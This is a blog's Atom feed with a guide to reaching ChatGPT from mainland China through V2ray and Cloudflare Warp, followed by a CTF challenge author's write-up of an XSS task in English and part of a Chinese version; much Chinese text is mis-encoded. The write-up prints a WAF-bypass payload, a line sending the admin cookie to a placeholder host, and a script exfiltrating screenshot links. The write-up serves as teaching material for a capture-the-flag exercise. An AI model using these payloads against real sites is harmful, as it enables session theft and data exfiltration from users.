<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ‰“ä»£ç çš„æ€ªå…½ CodeMonster</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.codemonster.cn/"/>
  <updated>2023-04-13T13:31:09.039Z</updated>
  <id>https://www.codemonster.cn/</id>
  
  <author>
    <name>CodeMonster</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä¸æ»‘åœ°åœ¨å¤§é™†ä½¿ç”¨ ChatGPT</title>
    <link href="https://www.codemonster.cn/2023/04/13/smooth-access-to-chatgpt/"/>
    <id>https://www.codemonster.cn/2023/04/13/smooth-access-to-chatgpt/</id>
    <published>2023-04-13T13:20:59.000Z</published>
    <updated>2023-04-13T13:31:09.039Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥ç»™åšå®¢é™¤è‰äº†ï¼Œåˆ†äº«ä¸€ä¸‹æœ€è¿‘ç”¨ ChatGPT çš„ä¸€äº›å°æŠ€å·§</p>
<a id="more"></a>
<h2 id="æ•´ä½“æ¶æ„"><a href="#æ•´ä½“æ¶æ„" class="headerlink" title="æ•´ä½“æ¶æ„"></a>æ•´ä½“æ¶æ„</h2><p>ç”±äºæŸäº›ä¸å¯è¨€è¯´çš„åŸå› ï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨ç½‘é¡µç‰ˆçš„ ChatGPTï¼Œéœ€è¦ä¸¤å¤´éƒ½ä¸Šä»£ç†ï¼Œæ•´ä½“æ¶æ„å›¾å¦‚ä¸‹ï¼Œæ€è·¯å°±æ˜¯ V2ray ç»•è¿‡å›½å†…å°é”ï¼Œå†åˆ©ç”¨ Warp ç»•è¿‡ openai å¯¹ VPS å‡ºå£ IP çš„å°é”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">                    â”‚  VPS                           â”‚</span><br><span class="line">                    â”‚                                â”‚</span><br><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚             â”‚     â”‚  â”‚         â”‚  â”‚              â”‚ â”‚   â”‚                 â”‚</span><br><span class="line">â”‚ V2rayClient â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â–º  V2ray  â”œâ”€â”€â–º  Warp Docker â”œâ”€â”¼â”€â”€â”€â–º chat.openai.com â”‚</span><br><span class="line">â”‚             â”‚     â”‚  â”‚         â”‚  â”‚              â”‚ â”‚   â”‚                 â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">                    â”‚        â”‚                       â”‚</span><br><span class="line">                    â”‚        â”‚                       â”‚</span><br><span class="line">                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">                             â”‚</span><br><span class="line">                             â”‚</span><br><span class="line">                             â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º  Internet</span><br></pre></td></tr></table></figure>
<h2 id="è½¯ç¡¬ä»¶å‡†å¤‡"><a href="#è½¯ç¡¬ä»¶å‡†å¤‡" class="headerlink" title="è½¯ç¡¬ä»¶å‡†å¤‡"></a>è½¯ç¡¬ä»¶å‡†å¤‡</h2><ol>
<li>ç¡¬ä»¶ï¼š<ul>
<li>æŸåœ°åŒº VPS ä¸€å°ï¼Œå†…å­˜ &gt;= 1G</li>
</ul>
</li>
<li>è½¯ä»¶ï¼š<ul>
<li>V2ray</li>
<li>docker</li>
<li>nginxï¼ˆå¥—tlséœ€è¦ï¼‰</li>
</ul>
</li>
</ol>
<h2 id="å®‰è£…-V2ray"><a href="#å®‰è£…-V2ray" class="headerlink" title="å®‰è£… V2ray"></a>å®‰è£… V2ray</h2><p>å‚è€ƒï¼š<a href="https://github.com/v2fly/fhs-install-v2ray/blob/master/README.zh-Hans-CN.md" target="_blank" rel="noopener">https://github.com/v2fly/fhs-install-v2ray/blob/master/README.zh-Hans-CN.md</a></p>
<p>ä¸€é”®å®‰è£…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;v2fly&#x2F;fhs-install-v2ray&#x2F;master&#x2F;install-release.sh)</span><br></pre></td></tr></table></figure></p>
<p>ä½¿ç”¨é…ç½®å°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œå¦å¤–è¿˜å¯ä»¥è§†æƒ…å†µæ¥å¥— vmess+tls+websocketï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢å° IPã€‚</p>
<h2 id="å¯åŠ¨-Warp"><a href="#å¯åŠ¨-Warp" class="headerlink" title="å¯åŠ¨ Warp"></a>å¯åŠ¨ Warp</h2><p>Cloudflare WARP æ˜¯ CloudÂ­flare æä¾›çš„ä¸€é¡¹åŸºäº WireÂ­Guard çš„ç½‘ç»œæµé‡å®‰å…¨åŠåŠ é€ŸæœåŠ¡ï¼Œèƒ½å¤Ÿè®©ä½ é€šè¿‡è¿æ¥åˆ° CloudÂ­flare çš„è¾¹ç¼˜èŠ‚ç‚¹å®ç°éšç§ä¿æŠ¤åŠé“¾è·¯ä¼˜åŒ–ã€‚<br>è¯¦æƒ…å¯ä»¥å‚è€ƒï¼š<a href="https://p3terx.com/archives/use-cloudflare-warp-to-add-extra-ipv4-or-ipv6-network-support-to-vps-servers-for-free.html" target="_blank" rel="noopener">https://p3terx.com/archives/use-cloudflare-warp-to-add-extra-ipv4-or-ipv6-network-support-to-vps-servers-for-free.html</a></p>
<p>å› ä¸ºè¦è£…çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œæˆ‘é€‰æ‹©ç›´æ¥ docker å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œç›‘å¬ 1080 å’Œ 8080 ç«¯å£ï¼Œåˆ†åˆ«æ˜¯ socks5 ä»£ç†å’Œ http ä»£ç†ï¼Œå¦‚æœç«¯å£å†²çªå°±æ¢ä¸€ä¸ªç«¯å£</p>
<p>ä¸€é”®å¯åŠ¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name warp -p 127.0.0.1:1080:1080 -p 127.0.0.1:8080:8080 --restart unless-stopped amirdaaee&#x2F;cloudflare-warp:latest</span><br></pre></td></tr></table></figure></p>
<p>å¯åŠ¨åéªŒè¯ä¸‹æ˜¯å¦æˆåŠŸ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x &quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot; ipinfo.io</span><br></pre></td></tr></table></figure><br>çœ‹åˆ°è¿”å›ç»“æœä¸­å¸¦æœ‰<code>&quot;org&quot;: &quot;ASxxxxx Cloudflare, Inc.&quot;</code>ï¼Œå°±è¯´æ˜æˆåŠŸäº†</p>
<h2 id="ä¿®æ”¹V2rayé…ç½®"><a href="#ä¿®æ”¹V2rayé…ç½®" class="headerlink" title="ä¿®æ”¹V2rayé…ç½®"></a>ä¿®æ”¹V2rayé…ç½®</h2><p>å› ä¸ºåªæœ‰ä¸ªåˆ«ç½‘ç«™éœ€è¦å¥— wrap è®¿é—®ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹ V2ray é…ç½®æ¥è¿›è¡Œè·¯ç”±åˆ†å‘ã€‚</p>
<p>ç¼–è¾‘ V2ray é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶åœ°å€å¯ä»¥æ‰§è¡Œ<code>ps aux|grep v2ray</code>æ¥æŸ¥çœ‹ï¼Œæˆ‘çš„æ˜¯ï¼š/usr/local/etc/v2ray/config.json<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;log&quot;: &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;inbounds&quot;: [</span><br><span class="line">    ...</span><br><span class="line">  ],</span><br><span class="line">  &quot;outbounds&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      &quot;tag&quot;: &quot;direct&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;protocol&quot;: &quot;socks&quot;,</span><br><span class="line">      &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;servers&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">            &quot;port&quot;: 1080,</span><br><span class="line">            &quot;users&quot;: []</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;tag&quot;: &quot;warp_proxy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;routing&quot;: &#123;</span><br><span class="line">    &quot;rules&quot;: [</span><br><span class="line">        ...</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;outboundTag&quot;: &quot;warp_proxy&quot;,</span><br><span class="line">        &quot;domain&quot;: [&quot;chat.openai.com&quot;]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>éœ€è¦ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼š</p>
<ol>
<li>åœ¨ routing é‡Œçš„ rules åˆ—è¡¨ï¼Œæ–°å¢ä¸€æ¡è·¯ç”±è§„åˆ™ï¼Œå°† chat.openai.com åŸŸåæ‰“ä¸Š warp_proxy æ ‡ç­¾</li>
<li>outbounds åˆ—è¡¨ä¸­æ–°å¢ä¸€é¡¹ï¼Œå¤„ç† warp_proxy æ ‡ç­¾çš„æµï¼Œè½¬ç»™<code>127.0.0.1:1080</code>çš„ sockets å¤„ç†</li>
</ol>
<p>æ”¹å®Œé…ç½®é‡å¯ä¸€ä¸‹ V2rayï¼Œç„¶åå°±èƒ½åœ¨å®¢æˆ·ç«¯æ„‰å¿«çš„ä½¿ç”¨ chatgpt ç½‘é¡µç‰ˆå’¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart v2ray</span><br></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ¥ç»™åšå®¢é™¤è‰äº†ï¼Œåˆ†äº«ä¸€ä¸‹æœ€è¿‘ç”¨ ChatGPT çš„ä¸€äº›å°æŠ€å·§&lt;/p&gt;
    
    </summary>
    
    
      <category term="ChatGPT" scheme="https://www.codemonster.cn/tags/ChatGPT/"/>
    
      <category term="V2ray" scheme="https://www.codemonster.cn/tags/V2ray/"/>
    
      <category term="Wrap" scheme="https://www.codemonster.cn/tags/Wrap/"/>
    
  </entry>
  
  <entry>
    <title>2020 De1CTF Animal Crossing WriteUp (En)</title>
    <link href="https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup-en/"/>
    <id>https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup-en/</id>
    <published>2020-05-06T05:34:59.000Z</published>
    <updated>2020-05-06T05:40:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>2020 De1CTF Animal Crossing WriteUp.<br><a id="more"></a></p>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Free passport creator lets you show your island!</p>
<h2 id="Level-1-bypass-the-cloud-WAF"><a href="#Level-1-bypass-the-cloud-WAF" class="headerlink" title="Level 1: bypass the cloud WAF"></a>Level 1: bypass the cloud WAF</h2><p>Cloud WAF usually has several layers and several filtering methods. Here I also designed two layers of protection.</p>
<h3 id="Layer-1-Blacklist-detection"><a href="#Layer-1-Blacklist-detection" class="headerlink" title="Layer 1: Blacklist detection"></a>Layer 1: Blacklist detection</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blackList = []<span class="keyword">string</span>&#123;</span><br><span class="line">	<span class="comment">//global</span></span><br><span class="line">	<span class="string">"document"</span>, <span class="string">"window"</span>, <span class="string">"top"</span>, <span class="string">"parent"</span>, <span class="string">"global"</span>, <span class="string">"this"</span>,</span><br><span class="line">	<span class="comment">//func</span></span><br><span class="line">	<span class="string">"console"</span>, <span class="string">"alert"</span>, <span class="string">"log"</span>, <span class="string">"promise"</span>, <span class="string">"fetch"</span>, <span class="string">"eval"</span>, <span class="string">"import"</span>,</span><br><span class="line">	<span class="comment">//char</span></span><br><span class="line">	<span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"`"</span>, <span class="string">"\\*"</span>, <span class="string">"&amp;"</span>, <span class="string">"#"</span>, <span class="string">"%"</span>, <span class="string">"\\\\"</span>,</span><br><span class="line">	<span class="comment">//key</span></span><br><span class="line">	<span class="string">"if"</span>, <span class="string">"set"</span>, <span class="string">"get"</span>, <span class="string">"with"</span>, <span class="string">"yield"</span>, <span class="string">"async"</span>, <span class="string">"wait"</span>, <span class="string">"func"</span>, <span class="string">"for"</span>, <span class="string">"error"</span>, <span class="string">"string"</span>,</span><br><span class="line">	<span class="comment">//string</span></span><br><span class="line">	<span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"url"</span>, <span class="string">"cookie"</span>, <span class="string">"src"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The way to bypass the blacklist is to avoid the strings and characters of ban. Here, because of the iris framework problem of go, the <code>;</code> and the data after it will be deleted, and can be bypassed with <code>%0a</code></p>
<h3 id="Layer-2-Static-syntax-analysis"><a href="#Layer-2-Static-syntax-analysis" class="headerlink" title="Layer 2: Static syntax analysis"></a>Layer 2: Static syntax analysis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Pass in data to fmt.Sprintf(&quot;&#39;%s&#39;;&quot;, data), and then parse the syntax. If parse fails, the error will be returned directly.</span><br><span class="line">2. And then we visit AST nodes:</span><br><span class="line">   1. VariableExpression&#x2F;AssignExpression, All declaration&#x2F;assignment statements will ban</span><br><span class="line">   2. CallExpression, all function call, and callee not Identifier, will ban, example:</span><br><span class="line">      1. ban:  test.test()ã€a[x]()</span><br><span class="line">      2. pass: test()</span><br><span class="line">   3. BracketExpression, all member reference and member is not Identifier, will ban, example:</span><br><span class="line">      1. ban:  a[1]ã€a[&#39;xx&#39;]</span><br><span class="line">      2. pass: a[x]</span><br></pre></td></tr></table></figure>
<p>This layer of WAF, in fact, only needs to find out the rule of ban and find the unprocessed syntax to bypass it. My expected solution here is to pass variables with <code>throw</code>, but there are many other syntax that can be used.</p>
<p>The payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=base64DATAXXXXXXX<span class="string">'%0atry&#123;throw '</span>ev<span class="string">'%2b'</span>al<span class="string">'&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a//</span></span><br></pre></td></tr></table></figure>
<p>After bypassing the two layers of WAF protection, the local successful alert, we can use:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://xxxx/?"</span> + btoa(ducument.cookie)</span><br></pre></td></tr></table></figure>
<p>get the admin cookie, and the cookie is a part of the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#x3D;De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure>
<h2 id="Level-2-read-400-pictures"><a href="#Level-2-read-400-pictures" class="headerlink" title="Level 2: read 400 pictures"></a>Level 2: read 400 pictures</h2><p>In the other half of the flag, hint:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the admin doing?</span><br></pre></td></tr></table></figure>
<p>Read the administratorâ€™s document, you will find that there are  400 PNG images, and the flag is hidden in these images. </p>
<p>Here are several solutions preset during the design:</p>
<ol>
<li>Bypass CSP to import html2canvas lib, get the screenshot and upload to server, get the image address and send it back, then download the image</li>
<li>Use the for loop to send all 400 pictures to /upload, get 400 picture addresses and send back</li>
<li>Read the pictures directly and send them back one by one, write scripts, or use for to circulate and batch transfer, but the return process needs code conversion, and after the transfer back, it also needs to be converted into pictures for splicing</li>
</ol>
<p>All three solutions can get the flag, I will introduce the solution of bypassing CSP and import html2canvas lib. Other methods are similar, so I wonâ€™t write them all (You can go to see the playersâ€™ writeup),</p>
<h3 id="Bypass-CSP-to-import-html2canvas-lib"><a href="#Bypass-CSP-to-import-html2canvas-lib" class="headerlink" title="Bypass CSP to import html2canvas lib"></a>Bypass CSP to import html2canvas lib</h3><p>The main function of this website is to create a animal crossing passport, The homepage has a <code>/upload</code> api for upload image, you can upload a file with <code>png</code> suffix, and use <code>fetch</code> get the png file source, then <code>eval</code> it. You can bypass CSP to import the html2canvas lib and execute it. </p>
<p>The png file:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">	...</span><br><span class="line">  ...</span><br><span class="line">html2canvas.js code</span><br><span class="line">	...</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// screenshot-&gt;upload screenshot-&gt;send img address back</span></span><br><span class="line">html2canvas(<span class="built_in">document</span>.body).then(<span class="function"><span class="keyword">function</span>(<span class="params">canvas</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> form = <span class="keyword">new</span> FormData(),</span><br><span class="line">        url = <span class="string">"/upload"</span>,</span><br><span class="line">        blob = <span class="keyword">new</span> Blob([canvas.toDataURL().toString()], &#123;<span class="attr">type</span> : <span class="string">"image/png"</span>&#125;)</span><br><span class="line">        file = <span class="keyword">new</span> File([blob], <span class="string">"a.png"</span>)</span><br><span class="line">        form.append(<span class="string">"file"</span>, file)</span><br><span class="line">        fetch(url, &#123;</span><br><span class="line">            method: <span class="string">"POST"</span>,</span><br><span class="line">            body: form</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            location.href=<span class="string">"//xxxxxxxxx:8099/?"</span>+data.data.toString()</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
<p>Here I also write the JS of screenshot operation into png. </p>
<p>It upload the screenshot to the server and get the returned image address, then send it back to the attacker</p>
<h3 id="Read-image-and-execute"><a href="#Read-image-and-execute" class="headerlink" title="Read image and execute"></a>Read image and execute</h3><p>After upload the image, get the png address, then you can read the image with the controllable JS part and execute it</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">`/static/images/xxxxxxxxx.png`</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>res.text()).then(<span class="function"><span class="params">txt</span>=&gt;</span><span class="built_in">eval</span>(txt))</span><br></pre></td></tr></table></figure>
<p>And you can use the method of bypassing the WAF to pack it</p>
<p>Finally, when submitted to the BOT, you can receive the address of the screenshot of the adminâ€™s interface, and download it to see the other half of the flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cool_GamE&#125;</span><br></pre></td></tr></table></figure>
<p>Flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;I_l1k4_cool_GamE&#125;</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020 De1CTF Animal Crossing WriteUp.&lt;br&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="XSS" scheme="https://www.codemonster.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>2020 De1CTF Animal Crossing WriteUp</title>
    <link href="https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/"/>
    <id>https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/</id>
    <published>2020-05-06T05:32:59.000Z</published>
    <updated>2020-05-06T05:35:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€å¹´ä¸€åº¦çš„De1CTFåˆæ¥äº†ï¼Œè¿™æ¬¡å‡ºäº†é“ç®€å•XSSé¢˜ï¼Œä¸‹é¢æ˜¯å…·ä½“WriteUpã€‚<br><a id="more"></a></p>
<h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>å…è´¹åˆ›å»ºæŠ¤ç…§æ¥å±•ç¤ºä½ çš„å²›å±¿ï¼</p>
<h2 id="ç¬¬ä¸€å…³ï¼šç»•è¿‡äº‘WAF"><a href="#ç¬¬ä¸€å…³ï¼šç»•è¿‡äº‘WAF" class="headerlink" title="ç¬¬ä¸€å…³ï¼šç»•è¿‡äº‘WAF"></a>ç¬¬ä¸€å…³ï¼šç»•è¿‡äº‘WAF</h2><p>äº‘WAFé€šå¸¸æœ‰å¥½å‡ å±‚å¥½å‡ ç§è¿‡æ»¤æ‰‹æ®µï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ˜¯è®¾è®¡äº†äº†ä¸¤å±‚é˜²æŠ¤</p>
<h3 id="ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹"><a href="#ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹" class="headerlink" title="ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹"></a>ç¬¬ä¸€å±‚ï¼šé»‘åå•æ£€æµ‹</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blackList = []<span class="keyword">string</span>&#123;</span><br><span class="line">	<span class="comment">//global</span></span><br><span class="line">	<span class="string">"document"</span>, <span class="string">"window"</span>, <span class="string">"top"</span>, <span class="string">"parent"</span>, <span class="string">"global"</span>, <span class="string">"this"</span>,</span><br><span class="line">	<span class="comment">//func</span></span><br><span class="line">	<span class="string">"console"</span>, <span class="string">"alert"</span>, <span class="string">"log"</span>, <span class="string">"promise"</span>, <span class="string">"fetch"</span>, <span class="string">"eval"</span>, <span class="string">"import"</span>,</span><br><span class="line">	<span class="comment">//char</span></span><br><span class="line">	<span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"`"</span>, <span class="string">"\\*"</span>, <span class="string">"&amp;"</span>, <span class="string">"#"</span>, <span class="string">"%"</span>, <span class="string">"\\\\"</span>,</span><br><span class="line">	<span class="comment">//key</span></span><br><span class="line">	<span class="string">"if"</span>, <span class="string">"set"</span>, <span class="string">"get"</span>, <span class="string">"with"</span>, <span class="string">"yield"</span>, <span class="string">"async"</span>, <span class="string">"wait"</span>, <span class="string">"func"</span>, <span class="string">"for"</span>, <span class="string">"error"</span>, <span class="string">"string"</span>,</span><br><span class="line">	<span class="comment">//string</span></span><br><span class="line">	<span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"url"</span>, <span class="string">"cookie"</span>, <span class="string">"src"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é»‘åå•çš„ç»•è¿‡æ€è·¯æ— éé¿å¼€è¢«bançš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ï¼Œè¿™é‡Œå› ä¸ºgoçš„irisæ¡†æ¶é—®é¢˜ï¼ˆçœ‹ä¸å‡ºæ¥æ˜¯golangå§ï¼‰ï¼Œå¯¼è‡´<code>;</code>åçš„ä¸œè¥¿ä¼šè¢«åˆ æ‰ï¼Œå¯ä»¥ç”¨%0aç»•è¿‡</p>
<h3 id="ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ"><a href="#ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ" class="headerlink" title="ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ"></a>ç¬¬äºŒå±‚ï¼šé™æ€è¯­æ³•åˆ†æ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. å°†dataä¼ å…¥&#96;fmt.Sprintf(&quot;&#39;%s&#39;;&quot;, data)&#96;ï¼Œç„¶åè¿›è¡Œè¯­æ³•è§£æï¼Œè¿™é‡Œparseå¤±è´¥ç›´æ¥ban</span><br><span class="line">2. æ¥ç€éå†ASTè¿›è¡Œåˆ†æï¼š</span><br><span class="line">   1. VariableExpression&#x2F;AssignExpressionï¼Œæ‰€æœ‰å£°æ˜è¯­å¥&#x2F;èµ‹å€¼è¯­å¥ç›´æ¥ban</span><br><span class="line">   2. CallExpressionï¼Œæ‰€æœ‰å‡½æ•°è°ƒç”¨çš„ï¼Œä¸”calleeä¸ä¸ºIdentifierçš„ç›´æ¥ban</span><br><span class="line">      1. banï¼š&#96;test.test()&#96;ã€&#96;a[x]()&#96;</span><br><span class="line">      2. passï¼š&#96;test()&#96;</span><br><span class="line">   3. BracketExpressionï¼Œä¹Ÿå°±æ˜¯æˆå‘˜å¼•ç”¨ï¼ŒMemberä¸ä¸ºIdentifierçš„ç›´æ¥banï¼Œ</span><br><span class="line">      1. banï¼š&#96;a[1]&#96;ã€&#96;a[&#39;xx&#39;]&#96;</span><br><span class="line">      2. passï¼š&#96;a[x]&#96;</span><br></pre></td></tr></table></figure>
